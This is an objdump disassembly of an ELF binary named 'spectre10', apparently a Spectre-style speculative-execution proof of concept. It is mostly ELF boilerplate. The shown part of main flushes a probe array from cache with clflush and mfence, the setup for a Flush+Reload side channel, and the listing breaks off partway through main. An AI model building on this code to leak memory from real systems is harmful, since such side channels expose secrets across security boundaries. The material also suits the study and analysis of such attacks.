
spectre10:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x4ab>
 248:	78 38                	js     282 <_init-0x49e>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 52 7d             	add    %dl,0x7d(%rdx)
 286:	31 16                	xor    %edx,(%rsi)
 288:	2f                   	(bad)  
 289:	ad                   	lods   %ds:(%rsi),%eax
 28a:	56                   	push   %rsi
 28b:	09 1d 01 82 7e 43    	or     %ebx,0x437e8201(%rip)        # 437e8492 <_end+0x434e6252>
 291:	5f                   	pop    %rdi
 292:	33 bb 52 14 98 08    	xor    0x8981452(%rbx),%edi

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	12 00                	adc    (%rax),%al
 2d2:	00 00                	add    %al,(%rax)
 2d4:	12 00                	adc    (%rax),%al
	...
 2e6:	00 00                	add    %al,(%rax)
 2e8:	84 00                	test   %al,(%rax)
 2ea:	00 00                	add    %al,(%rax)
 2ec:	12 00                	adc    (%rax),%al
	...
 2fe:	00 00                	add    %al,(%rax)
 300:	9f                   	lahf   
 301:	00 00                	add    %al,(%rax)
 303:	00 20                	add    %ah,(%rax)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 1e                	add    %bl,(%rsi)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 2f                	add    %ch,(%rdi)
 331:	00 00                	add    %al,(%rax)
 333:	00 12                	add    %dl,(%rdx)
	...
 345:	00 00                	add    %al,(%rax)
 347:	00 72 00             	add    %dh,0x0(%rdx)
 34a:	00 00                	add    %al,(%rax)
 34c:	12 00                	adc    (%rax),%al
	...
 35e:	00 00                	add    %al,(%rax)
 360:	4a 00 00             	rex.WX add %al,(%rax)
 363:	00 12                	add    %dl,(%rdx)
	...
 375:	00 00                	add    %al,(%rax)
 377:	00 0b                	add    %cl,(%rbx)
 379:	00 00                	add    %al,(%rax)
 37b:	00 12                	add    %dl,(%rdx)
	...
 38d:	00 00                	add    %al,(%rax)
 38f:	00 36                	add    %dh,(%rsi)
 391:	00 00                	add    %al,(%rax)
 393:	00 12                	add    %dl,(%rdx)
	...
 3a5:	00 00                	add    %al,(%rax)
 3a7:	00 bb 00 00 00 20    	add    %bh,0x20000000(%rbx)
	...
 3bd:	00 00                	add    %al,(%rax)
 3bf:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
 3c3:	00 12                	add    %dl,(%rdx)
	...
 3d5:	00 00                	add    %al,(%rax)
 3d7:	00 42 00             	add    %al,0x0(%rdx)
 3da:	00 00                	add    %al,(%rax)
 3dc:	12 00                	adc    (%rax),%al
	...
 3ee:	00 00                	add    %al,(%rax)
 3f0:	ca 00 00             	lret   $0x0
 3f3:	00 20                	add    %ah,(%rax)
	...
 405:	00 00                	add    %al,(%rax)
 407:	00 63 00             	add    %ah,0x0(%rbx)
 40a:	00 00                	add    %al,(%rax)
 40c:	22 00                	and    (%rax),%al
	...
 41e:	00 00                	add    %al,(%rax)
 420:	52                   	push   %rdx
 421:	00 00                	add    %al,(%rax)
 423:	00 12                	add    %dl,(%rdx)
	...

Disassembly of section .dynstr:

0000000000000438 <.dynstr>:
 438:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 43c:	63 2e                	movslq (%rsi),%ebp
 43e:	73 6f                	jae    4af <_init-0x271>
 440:	2e 36 00 73 69       	cs add %dh,%ss:0x69(%rbx)
 445:	67 6e                	outsb  %ds:(%esi),(%dx)
 447:	61                   	(bad)  
 448:	6c                   	insb   (%dx),%es:(%rdi)
 449:	00 73 69             	add    %dh,0x69(%rbx)
 44c:	67 70 72             	addr32 jo 4c1 <_init-0x25f>
 44f:	6f                   	outsl  %ds:(%rsi),(%dx)
 450:	63 6d 61             	movslq 0x61(%rbp),%ebp
 453:	73 6b                	jae    4c0 <_init-0x260>
 455:	00 5f 5f             	add    %bl,0x5f(%rdi)
 458:	73 74                	jae    4ce <_init-0x252>
 45a:	61                   	(bad)  
 45b:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
 45e:	63 68 6b             	movslq 0x6b(%rax),%ebp
 461:	5f                   	pop    %rdi
 462:	66 61                	data16 (bad) 
 464:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%rax,%rax,1),%ebp
 46b:	74 
 46c:	66 00 73 69          	data16 add %dh,0x69(%rbx)
 470:	67 65 6d             	gs insl (%dx),%es:(%edi)
 473:	70 74                	jo     4e9 <_init-0x237>
 475:	79 73                	jns    4ea <_init-0x236>
 477:	65 74 00             	gs je  47a <_init-0x2a6>
 47a:	6c                   	insb   (%dx),%es:(%rdi)
 47b:	6f                   	outsl  %ds:(%rsi),(%dx)
 47c:	6e                   	outsb  %ds:(%rsi),(%dx)
 47d:	67 6a 6d             	addr32 pushq $0x6d
 480:	70 00                	jo     482 <_init-0x29e>
 482:	5f                   	pop    %rdi
 483:	73 65                	jae    4ea <_init-0x236>
 485:	74 6a                	je     4f1 <_init-0x22f>
 487:	6d                   	insl   (%dx),%es:(%rdi)
 488:	70 00                	jo     48a <_init-0x296>
 48a:	73 69                	jae    4f5 <_init-0x22b>
 48c:	67 61                	addr32 (bad) 
 48e:	64 64 73 65          	fs fs jae 4f7 <_init-0x229>
 492:	74 00                	je     494 <_init-0x28c>
 494:	6d                   	insl   (%dx),%es:(%rdi)
 495:	61                   	(bad)  
 496:	6c                   	insb   (%dx),%es:(%rdi)
 497:	6c                   	insb   (%dx),%es:(%rdi)
 498:	6f                   	outsl  %ds:(%rsi),(%dx)
 499:	63 00                	movslq (%rax),%eax
 49b:	5f                   	pop    %rdi
 49c:	5f                   	pop    %rdi
 49d:	63 78 61             	movslq 0x61(%rax),%edi
 4a0:	5f                   	pop    %rdi
 4a1:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 4a7:	7a 65                	jp     50e <_init-0x212>
 4a9:	00 5f 5f             	add    %bl,0x5f(%rdi)
 4ac:	6c                   	insb   (%dx),%es:(%rdi)
 4ad:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 4b4:	72 74                	jb     52a <_init-0x1f6>
 4b6:	5f                   	pop    %rdi
 4b7:	6d                   	insl   (%dx),%es:(%rdi)
 4b8:	61                   	(bad)  
 4b9:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 4c0:	00 47 4c             	add    %al,0x4c(%rdi)
 4c3:	49                   	rex.WB
 4c4:	42                   	rex.X
 4c5:	43 5f                	rex.XB pop %r15
 4c7:	32 2e                	xor    (%rsi),%ch
 4c9:	34 00                	xor    $0x0,%al
 4cb:	47                   	rex.RXB
 4cc:	4c                   	rex.WR
 4cd:	49                   	rex.WB
 4ce:	42                   	rex.X
 4cf:	43 5f                	rex.XB pop %r15
 4d1:	32 2e                	xor    (%rsi),%ch
 4d3:	32 2e                	xor    (%rsi),%ch
 4d5:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 4da:	4d 5f                	rex.WRB pop %r15
 4dc:	64 65 72 65          	fs gs jb 545 <_init-0x1db>
 4e0:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 4e7:	4d 
 4e8:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 4ea:	6f                   	outsl  %ds:(%rsi),(%dx)
 4eb:	6e                   	outsb  %ds:(%rsi),(%dx)
 4ec:	65 54                	gs push %rsp
 4ee:	61                   	(bad)  
 4ef:	62                   	(bad)  
 4f0:	6c                   	insb   (%dx),%es:(%rdi)
 4f1:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 4f5:	67 6d                	insl   (%dx),%es:(%edi)
 4f7:	6f                   	outsl  %ds:(%rsi),(%dx)
 4f8:	6e                   	outsb  %ds:(%rsi),(%dx)
 4f9:	5f                   	pop    %rdi
 4fa:	73 74                	jae    570 <_init-0x1b0>
 4fc:	61                   	(bad)  
 4fd:	72 74                	jb     573 <_init-0x1ad>
 4ff:	5f                   	pop    %rdi
 500:	5f                   	pop    %rdi
 501:	00 5f 49             	add    %bl,0x49(%rdi)
 504:	54                   	push   %rsp
 505:	4d 5f                	rex.WRB pop %r15
 507:	72 65                	jb     56e <_init-0x1b2>
 509:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 510:	4d 
 511:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 513:	6f                   	outsl  %ds:(%rsi),(%dx)
 514:	6e                   	outsb  %ds:(%rsi),(%dx)
 515:	65 54                	gs push %rsp
 517:	61                   	(bad)  
 518:	62                   	.byte 0x62
 519:	6c                   	insb   (%dx),%es:(%rdi)
 51a:	65                   	gs
	...

Disassembly of section .gnu.version:

000000000000051c <.gnu.version>:
 51c:	00 00                	add    %al,(%rax)
 51e:	02 00                	add    (%rax),%al
 520:	02 00                	add    (%rax),%al
 522:	00 00                	add    %al,(%rax)
 524:	03 00                	add    (%rax),%eax
 526:	02 00                	add    (%rax),%al
 528:	02 00                	add    (%rax),%al
 52a:	02 00                	add    (%rax),%al
 52c:	02 00                	add    (%rax),%al
 52e:	02 00                	add    (%rax),%al
 530:	00 00                	add    %al,(%rax)
 532:	02 00                	add    (%rax),%al
 534:	02 00                	add    (%rax),%al
 536:	00 00                	add    %al,(%rax)
 538:	02 00                	add    (%rax),%al
 53a:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000540 <.gnu.version_r>:
 540:	01 00                	add    %eax,(%rax)
 542:	02 00                	add    (%rax),%al
 544:	01 00                	add    %eax,(%rax)
 546:	00 00                	add    %al,(%rax)
 548:	10 00                	adc    %al,(%rax)
 54a:	00 00                	add    %al,(%rax)
 54c:	00 00                	add    %al,(%rax)
 54e:	00 00                	add    %al,(%rax)
 550:	14 69                	adc    $0x69,%al
 552:	69 0d 00 00 03 00 89 	imul   $0x89,0x30000(%rip),%ecx        # 3055c <__FRAME_END__+0x2f418>
 559:	00 00 00 
 55c:	10 00                	adc    %al,(%rax)
 55e:	00 00                	add    %al,(%rax)
 560:	75 1a                	jne    57c <_init-0x1a4>
 562:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 568:	93                   	xchg   %eax,%ebx
 569:	00 00                	add    %al,(%rax)
 56b:	00 00                	add    %al,(%rax)
 56d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000570 <.rela.dyn>:
 570:	70 1d                	jo     58f <_init-0x191>
 572:	20 00                	and    %al,(%rax)
 574:	00 00                	add    %al,(%rax)
 576:	00 00                	add    %al,(%rax)
 578:	08 00                	or     %al,(%rax)
 57a:	00 00                	add    %al,(%rax)
 57c:	00 00                	add    %al,(%rax)
 57e:	00 00                	add    %al,(%rax)
 580:	00 09                	add    %cl,(%rcx)
 582:	00 00                	add    %al,(%rax)
 584:	00 00                	add    %al,(%rax)
 586:	00 00                	add    %al,(%rax)
 588:	78 1d                	js     5a7 <_init-0x179>
 58a:	20 00                	and    %al,(%rax)
 58c:	00 00                	add    %al,(%rax)
 58e:	00 00                	add    %al,(%rax)
 590:	08 00                	or     %al,(%rax)
 592:	00 00                	add    %al,(%rax)
 594:	00 00                	add    %al,(%rax)
 596:	00 00                	add    %al,(%rax)
 598:	c0 08 00             	rorb   $0x0,(%rax)
 59b:	00 00                	add    %al,(%rax)
 59d:	00 00                	add    %al,(%rax)
 59f:	00 08                	add    %cl,(%rax)
 5a1:	20 20                	and    %ah,(%rax)
 5a3:	00 00                	add    %al,(%rax)
 5a5:	00 00                	add    %al,(%rax)
 5a7:	00 08                	add    %cl,(%rax)
 5a9:	00 00                	add    %al,(%rax)
 5ab:	00 00                	add    %al,(%rax)
 5ad:	00 00                	add    %al,(%rax)
 5af:	00 08                	add    %cl,(%rax)
 5b1:	20 20                	and    %ah,(%rax)
 5b3:	00 00                	add    %al,(%rax)
 5b5:	00 00                	add    %al,(%rax)
 5b7:	00 d8                	add    %bl,%al
 5b9:	1f                   	(bad)  
 5ba:	20 00                	and    %al,(%rax)
 5bc:	00 00                	add    %al,(%rax)
 5be:	00 00                	add    %al,(%rax)
 5c0:	06                   	(bad)  
 5c1:	00 00                	add    %al,(%rax)
 5c3:	00 03                	add    %al,(%rbx)
	...
 5cd:	00 00                	add    %al,(%rax)
 5cf:	00 e0                	add    %ah,%al
 5d1:	1f                   	(bad)  
 5d2:	20 00                	and    %al,(%rax)
 5d4:	00 00                	add    %al,(%rax)
 5d6:	00 00                	add    %al,(%rax)
 5d8:	06                   	(bad)  
 5d9:	00 00                	add    %al,(%rax)
 5db:	00 06                	add    %al,(%rsi)
	...
 5e5:	00 00                	add    %al,(%rax)
 5e7:	00 e8                	add    %ch,%al
 5e9:	1f                   	(bad)  
 5ea:	20 00                	and    %al,(%rax)
 5ec:	00 00                	add    %al,(%rax)
 5ee:	00 00                	add    %al,(%rax)
 5f0:	06                   	(bad)  
 5f1:	00 00                	add    %al,(%rax)
 5f3:	00 0a                	add    %cl,(%rdx)
	...
 5fd:	00 00                	add    %al,(%rax)
 5ff:	00 f0                	add    %dh,%al
 601:	1f                   	(bad)  
 602:	20 00                	and    %al,(%rax)
 604:	00 00                	add    %al,(%rax)
 606:	00 00                	add    %al,(%rax)
 608:	06                   	(bad)  
 609:	00 00                	add    %al,(%rax)
 60b:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 611 <_init-0x10f>
 611:	00 00                	add    %al,(%rax)
 613:	00 00                	add    %al,(%rax)
 615:	00 00                	add    %al,(%rax)
 617:	00 f8                	add    %bh,%al
 619:	1f                   	(bad)  
 61a:	20 00                	and    %al,(%rax)
 61c:	00 00                	add    %al,(%rax)
 61e:	00 00                	add    %al,(%rax)
 620:	06                   	(bad)  
 621:	00 00                	add    %al,(%rax)
 623:	00 0e                	add    %cl,(%rsi)
	...

Disassembly of section .rela.plt:

0000000000000630 <.rela.plt>:
 630:	88 1f                	mov    %bl,(%rdi)
 632:	20 00                	and    %al,(%rax)
 634:	00 00                	add    %al,(%rax)
 636:	00 00                	add    %al,(%rax)
 638:	07                   	(bad)  
 639:	00 00                	add    %al,(%rax)
 63b:	00 01                	add    %al,(%rcx)
	...
 645:	00 00                	add    %al,(%rax)
 647:	00 90 1f 20 00 00    	add    %dl,0x201f(%rax)
 64d:	00 00                	add    %al,(%rax)
 64f:	00 07                	add    %al,(%rdi)
 651:	00 00                	add    %al,(%rax)
 653:	00 02                	add    %al,(%rdx)
	...
 65d:	00 00                	add    %al,(%rax)
 65f:	00 98 1f 20 00 00    	add    %bl,0x201f(%rax)
 665:	00 00                	add    %al,(%rax)
 667:	00 07                	add    %al,(%rdi)
 669:	00 00                	add    %al,(%rax)
 66b:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 676:	00 00                	add    %al,(%rax)
 678:	a0 1f 20 00 00 00 00 	movabs 0x70000000000201f,%al
 67f:	00 07 
 681:	00 00                	add    %al,(%rax)
 683:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 689 <_init-0x97>
 689:	00 00                	add    %al,(%rax)
 68b:	00 00                	add    %al,(%rax)
 68d:	00 00                	add    %al,(%rax)
 68f:	00 a8 1f 20 00 00    	add    %ch,0x201f(%rax)
 695:	00 00                	add    %al,(%rax)
 697:	00 07                	add    %al,(%rdi)
 699:	00 00                	add    %al,(%rax)
 69b:	00 07                	add    %al,(%rdi)
	...
 6a5:	00 00                	add    %al,(%rax)
 6a7:	00 b0 1f 20 00 00    	add    %dh,0x201f(%rax)
 6ad:	00 00                	add    %al,(%rax)
 6af:	00 07                	add    %al,(%rdi)
 6b1:	00 00                	add    %al,(%rax)
 6b3:	00 08                	add    %cl,(%rax)
	...
 6bd:	00 00                	add    %al,(%rax)
 6bf:	00 b8 1f 20 00 00    	add    %bh,0x201f(%rax)
 6c5:	00 00                	add    %al,(%rax)
 6c7:	00 07                	add    %al,(%rdi)
 6c9:	00 00                	add    %al,(%rax)
 6cb:	00 09                	add    %cl,(%rcx)
	...
 6d5:	00 00                	add    %al,(%rax)
 6d7:	00 c0                	add    %al,%al
 6d9:	1f                   	(bad)  
 6da:	20 00                	and    %al,(%rax)
 6dc:	00 00                	add    %al,(%rax)
 6de:	00 00                	add    %al,(%rax)
 6e0:	07                   	(bad)  
 6e1:	00 00                	add    %al,(%rax)
 6e3:	00 0b                	add    %cl,(%rbx)
	...
 6ed:	00 00                	add    %al,(%rax)
 6ef:	00 c8                	add    %cl,%al
 6f1:	1f                   	(bad)  
 6f2:	20 00                	and    %al,(%rax)
 6f4:	00 00                	add    %al,(%rax)
 6f6:	00 00                	add    %al,(%rax)
 6f8:	07                   	(bad)  
 6f9:	00 00                	add    %al,(%rax)
 6fb:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...
 706:	00 00                	add    %al,(%rax)
 708:	d0 1f                	rcrb   (%rdi)
 70a:	20 00                	and    %al,(%rax)
 70c:	00 00                	add    %al,(%rax)
 70e:	00 00                	add    %al,(%rax)
 710:	07                   	(bad)  
 711:	00 00                	add    %al,(%rax)
 713:	00 0f                	add    %cl,(%rdi)
	...

Disassembly of section .init:

0000000000000720 <_init>:
 720:	48 83 ec 08          	sub    $0x8,%rsp
 724:	48 8b 05 bd 18 20 00 	mov    0x2018bd(%rip),%rax        # 201fe8 <__gmon_start__>
 72b:	48 85 c0             	test   %rax,%rax
 72e:	74 02                	je     732 <_init+0x12>
 730:	ff d0                	callq  *%rax
 732:	48 83 c4 08          	add    $0x8,%rsp
 736:	c3                   	retq   

Disassembly of section .plt:

0000000000000740 <.plt>:
 740:	ff 35 32 18 20 00    	pushq  0x201832(%rip)        # 201f78 <_GLOBAL_OFFSET_TABLE_+0x8>
 746:	ff 25 34 18 20 00    	jmpq   *0x201834(%rip)        # 201f80 <_GLOBAL_OFFSET_TABLE_+0x10>
 74c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000750 <sigprocmask@plt>:
 750:	ff 25 32 18 20 00    	jmpq   *0x201832(%rip)        # 201f88 <sigprocmask@GLIBC_2.2.5>
 756:	68 00 00 00 00       	pushq  $0x0
 75b:	e9 e0 ff ff ff       	jmpq   740 <.plt>

0000000000000760 <free@plt>:
 760:	ff 25 2a 18 20 00    	jmpq   *0x20182a(%rip)        # 201f90 <free@GLIBC_2.2.5>
 766:	68 01 00 00 00       	pushq  $0x1
 76b:	e9 d0 ff ff ff       	jmpq   740 <.plt>

0000000000000770 <__stack_chk_fail@plt>:
 770:	ff 25 22 18 20 00    	jmpq   *0x201822(%rip)        # 201f98 <__stack_chk_fail@GLIBC_2.4>
 776:	68 02 00 00 00       	pushq  $0x2
 77b:	e9 c0 ff ff ff       	jmpq   740 <.plt>

0000000000000780 <printf@plt>:
 780:	ff 25 1a 18 20 00    	jmpq   *0x20181a(%rip)        # 201fa0 <printf@GLIBC_2.2.5>
 786:	68 03 00 00 00       	pushq  $0x3
 78b:	e9 b0 ff ff ff       	jmpq   740 <.plt>

0000000000000790 <_setjmp@plt>:
 790:	ff 25 12 18 20 00    	jmpq   *0x201812(%rip)        # 201fa8 <_setjmp@GLIBC_2.2.5>
 796:	68 04 00 00 00       	pushq  $0x4
 79b:	e9 a0 ff ff ff       	jmpq   740 <.plt>

00000000000007a0 <signal@plt>:
 7a0:	ff 25 0a 18 20 00    	jmpq   *0x20180a(%rip)        # 201fb0 <signal@GLIBC_2.2.5>
 7a6:	68 05 00 00 00       	pushq  $0x5
 7ab:	e9 90 ff ff ff       	jmpq   740 <.plt>

00000000000007b0 <sigemptyset@plt>:
 7b0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 7b6:	68 06 00 00 00       	pushq  $0x6
 7bb:	e9 80 ff ff ff       	jmpq   740 <.plt>

00000000000007c0 <malloc@plt>:
 7c0:	ff 25 fa 17 20 00    	jmpq   *0x2017fa(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 7c6:	68 07 00 00 00       	pushq  $0x7
 7cb:	e9 70 ff ff ff       	jmpq   740 <.plt>

00000000000007d0 <longjmp@plt>:
 7d0:	ff 25 f2 17 20 00    	jmpq   *0x2017f2(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 7d6:	68 08 00 00 00       	pushq  $0x8
 7db:	e9 60 ff ff ff       	jmpq   740 <.plt>

00000000000007e0 <sigaddset@plt>:
 7e0:	ff 25 ea 17 20 00    	jmpq   *0x2017ea(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 7e6:	68 09 00 00 00       	pushq  $0x9
 7eb:	e9 50 ff ff ff       	jmpq   740 <.plt>

Disassembly of section .plt.got:

00000000000007f0 <__cxa_finalize@plt>:
 7f0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 7f6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000800 <_start>:
 800:	31 ed                	xor    %ebp,%ebp
 802:	49 89 d1             	mov    %rdx,%r9
 805:	5e                   	pop    %rsi
 806:	48 89 e2             	mov    %rsp,%rdx
 809:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 80d:	50                   	push   %rax
 80e:	54                   	push   %rsp
 80f:	4c 8d 05 7a 06 00 00 	lea    0x67a(%rip),%r8        # e90 <__libc_csu_fini>
 816:	48 8d 0d 03 06 00 00 	lea    0x603(%rip),%rcx        # e20 <__libc_csu_init>
 81d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 90a <main>
 824:	ff 15 b6 17 20 00    	callq  *0x2017b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 82a:	f4                   	hlt    
 82b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000830 <deregister_tm_clones>:
 830:	48 8d 3d d9 18 20 00 	lea    0x2018d9(%rip),%rdi        # 202110 <__TMC_END__>
 837:	55                   	push   %rbp
 838:	48 8d 05 d1 18 20 00 	lea    0x2018d1(%rip),%rax        # 202110 <__TMC_END__>
 83f:	48 39 f8             	cmp    %rdi,%rax
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 19                	je     860 <deregister_tm_clones+0x30>
 847:	48 8b 05 8a 17 20 00 	mov    0x20178a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 84e:	48 85 c0             	test   %rax,%rax
 851:	74 0d                	je     860 <deregister_tm_clones+0x30>
 853:	5d                   	pop    %rbp
 854:	ff e0                	jmpq   *%rax
 856:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 85d:	00 00 00 
 860:	5d                   	pop    %rbp
 861:	c3                   	retq   
 862:	0f 1f 40 00          	nopl   0x0(%rax)
 866:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 86d:	00 00 00 

0000000000000870 <register_tm_clones>:
 870:	48 8d 3d 99 18 20 00 	lea    0x201899(%rip),%rdi        # 202110 <__TMC_END__>
 877:	48 8d 35 92 18 20 00 	lea    0x201892(%rip),%rsi        # 202110 <__TMC_END__>
 87e:	55                   	push   %rbp
 87f:	48 29 fe             	sub    %rdi,%rsi
 882:	48 89 e5             	mov    %rsp,%rbp
 885:	48 c1 fe 03          	sar    $0x3,%rsi
 889:	48 89 f0             	mov    %rsi,%rax
 88c:	48 c1 e8 3f          	shr    $0x3f,%rax
 890:	48 01 c6             	add    %rax,%rsi
 893:	48 d1 fe             	sar    %rsi
 896:	74 18                	je     8b0 <register_tm_clones+0x40>
 898:	48 8b 05 51 17 20 00 	mov    0x201751(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 89f:	48 85 c0             	test   %rax,%rax
 8a2:	74 0c                	je     8b0 <register_tm_clones+0x40>
 8a4:	5d                   	pop    %rbp
 8a5:	ff e0                	jmpq   *%rax
 8a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 8ae:	00 00 
 8b0:	5d                   	pop    %rbp
 8b1:	c3                   	retq   
 8b2:	0f 1f 40 00          	nopl   0x0(%rax)
 8b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 8bd:	00 00 00 

00000000000008c0 <__do_global_dtors_aux>:
 8c0:	80 3d 59 18 20 00 00 	cmpb   $0x0,0x201859(%rip)        # 202120 <completed.7697>
 8c7:	75 2f                	jne    8f8 <__do_global_dtors_aux+0x38>
 8c9:	48 83 3d 27 17 20 00 	cmpq   $0x0,0x201727(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 8d0:	00 
 8d1:	55                   	push   %rbp
 8d2:	48 89 e5             	mov    %rsp,%rbp
 8d5:	74 0c                	je     8e3 <__do_global_dtors_aux+0x23>
 8d7:	48 8b 3d 2a 17 20 00 	mov    0x20172a(%rip),%rdi        # 202008 <__dso_handle>
 8de:	e8 0d ff ff ff       	callq  7f0 <__cxa_finalize@plt>
 8e3:	e8 48 ff ff ff       	callq  830 <deregister_tm_clones>
 8e8:	c6 05 31 18 20 00 01 	movb   $0x1,0x201831(%rip)        # 202120 <completed.7697>
 8ef:	5d                   	pop    %rbp
 8f0:	c3                   	retq   
 8f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 8f8:	f3 c3                	repz retq 
 8fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000900 <frame_dummy>:
 900:	55                   	push   %rbp
 901:	48 89 e5             	mov    %rsp,%rbp
 904:	5d                   	pop    %rbp
 905:	e9 66 ff ff ff       	jmpq   870 <register_tm_clones>

000000000000090a <main>:
 90a:	55                   	push   %rbp
 90b:	48 89 e5             	mov    %rsp,%rbp
 90e:	48 83 ec 20          	sub    $0x20,%rsp
 912:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 919:	eb 24                	jmp    93f <main+0x35>
 91b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 91e:	99                   	cltd   
 91f:	c1 ea 18             	shr    $0x18,%edx
 922:	01 d0                	add    %edx,%eax
 924:	0f b6 c0             	movzbl %al,%eax
 927:	29 d0                	sub    %edx,%eax
 929:	89 c1                	mov    %eax,%ecx
 92b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 92e:	48 63 d0             	movslq %eax,%rdx
 931:	48 8d 05 08 19 20 00 	lea    0x201908(%rip),%rax        # 202240 <array>
 938:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 93b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 93f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 946:	7e d3                	jle    91b <main+0x11>
 948:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 94f:	e9 b1 00 00 00       	jmpq   a05 <main+0xfb>
 954:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 95b:	eb 1a                	jmp    977 <main+0x6d>
 95d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 960:	c1 e0 0c             	shl    $0xc,%eax
 963:	48 63 d0             	movslq %eax,%rdx
 966:	48 8d 05 d3 18 20 00 	lea    0x2018d3(%rip),%rax        # 202240 <array>
 96d:	48 01 d0             	add    %rdx,%rax
 970:	0f ae 38             	clflush (%rax)
 973:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 977:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 97e:	7e dd                	jle    95d <main+0x53>
 980:	0f ae f0             	mfence 
 983:	bf 00 04 00 00       	mov    $0x400,%edi
 988:	e8 33 fe ff ff       	callq  7c0 <malloc@plt>
 98d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 991:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 998:	eb 1e                	jmp    9b8 <main+0xae>
 99a:	8b 45 ec             	mov    -0x14(%rbp),%eax
